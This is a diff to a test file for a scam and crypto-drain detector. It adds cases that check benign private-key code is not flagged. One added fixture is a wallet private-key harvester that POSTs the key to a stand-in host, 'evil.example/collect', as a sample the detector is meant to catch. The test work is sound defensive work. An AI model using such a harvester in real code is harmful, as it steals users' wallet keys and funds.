@@ -21,8 +21,8 @@ function extractFn(src, name) {
 
 const src = readFileSync(resolve(process.cwd(), 'bg/analyzer.js'), 'utf8');
 // detectScamSignals references module-level SCAM_* regexes; pull them in too.
-// The generator emits them as `var SCAM_SEED_HARVEST = ...` just before the fn.
-const regexStart = src.search(/(?:const|var|let)\s+SCAM_SEED_HARVEST/);
+// The generator emits them as `var SCAM_WALLET_SECRET = ...` just before the fn.
+const regexStart = src.search(/(?:const|var|let)\s+SCAM_WALLET_SECRET/);
 const regexes = src.slice(regexStart, src.indexOf('function detectScamSignals'));
 const detectScamSignals = new Function(`${regexes}\n${extractFn(src, 'detectScamSignals')}\nreturn detectScamSignals;`)();
 
@@ -67,5 +67,36 @@ describe('scam / crypto-drain detector', () => {
     const r = detectScamSignals(`const pk = wallet.privateKey; console.log(pk);`);
     expect(ids(r)).toContain('wallet-seed-access');
     expect(ids(r)).not.toContain('credential-exfil');
+  });
+
+  it('does NOT flag a WebCrypto script that generates a keypair and fetches', () => {
+    const code = `
+      const keyPair = await crypto.subtle.generateKey({ name: 'RSA-PSS', hash: 'SHA-256' }, true, ['sign']);
+      const sig = await crypto.subtle.sign('RSA-PSS', keyPair.privateKey, data);
+      await fetch('/api/verify', { method: 'POST', body: sig });
+    `;
+    const r = detectScamSignals(code);
+    expect(ids(r)).not.toContain('wallet-seed-access');
+    expect(ids(r)).not.toContain('credential-exfil');
+  });
+
+  it('does NOT ban a non-wallet private-key tool that calls fetch as exfiltration', () => {
+    // An SSH/JWT helper that references "privateKey" and fetches must not be
+    // flagged as high-severity wallet exfiltration (no wallet context).
+    const code = `
+      const privateKey = document.getElementById('sshKey').value;
+      fetch('/api/deploy', { method: 'POST', body: privateKey });
+    `;
+    const r = detectScamSignals(code);
+    expect(ids(r)).not.toContain('credential-exfil');
+  });
+
+  it('still flags a wallet-context private-key harvester that exfiltrates', () => {
+    const code = `
+      const pk = window.ethereum.selectedAddress && wallet.privateKey;
+      fetch('https://evil.example/collect', { method: 'POST', body: pk });
+    `;
+    const r = detectScamSignals(code);
+    expect(ids(r)).toContain('credential-exfil');
   });
 });
